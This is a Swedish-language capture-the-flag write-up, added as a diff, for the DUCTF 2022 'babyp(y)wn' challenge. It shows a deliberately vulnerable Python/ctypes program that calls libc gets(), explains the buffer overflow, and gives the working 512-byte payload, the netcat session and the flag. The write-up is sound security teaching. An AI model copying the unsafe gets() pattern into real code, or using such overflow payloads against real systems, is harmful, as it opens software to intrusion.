@@ -1,0 +1,28 @@
+# babyp(y)wn
+
+Uppgiften består av en adress och port som man kan ansluta till med netcat, samt en fil med koden till programmet man interagerar med. Koden är skriven i python, men använder sig av c-anrop, vilket gör att man kringgår pythons inbyggda skydd mot buffer overflows mm:
+```python
+#!/usr/bin/env python3
+
+from ctypes import CDLL, c_buffer
+libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
+buf1 = c_buffer(512)
+buf2 = c_buffer(512)
+libc.gets(buf1)
+if b'DUCTF' in bytes(buf2):
+    print(open('./flag.txt', 'r').read())
+```
+Programmet består av två stycken byte-buffers (array av bytes), båda 512 byte stora. Det läser in från STDIN till `buf1`, och därefter kontrollerar det om sekvensen `DUCTF` finns i `buf2`, och skriver i så fall ut flaggan, som finns sparad i en textfil.
+
+För att lösa detta behöver vi skicka en så stor mängd data att `buf1` blir full. Vad som händer då är att programmet kommer fortsätta skriva till de minnesaddresser som kommer efter, vilka egentligen tillhör `buf2`, så att vi kan få in `DUCTF` där.
+
+Vi får helt enkelt skapa en 512 tecken lång sträng följd av `DUCTF` och skicka allt på en gång. Vi kan till exempel öppna notepad och skapa texten
+```
+00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000DUCTF
+```
+Vilken vi sedan skickar via netcat:
+```
+$ nc 2022.ductf.dev 30021
+00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000DUCTF
+DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}
+```
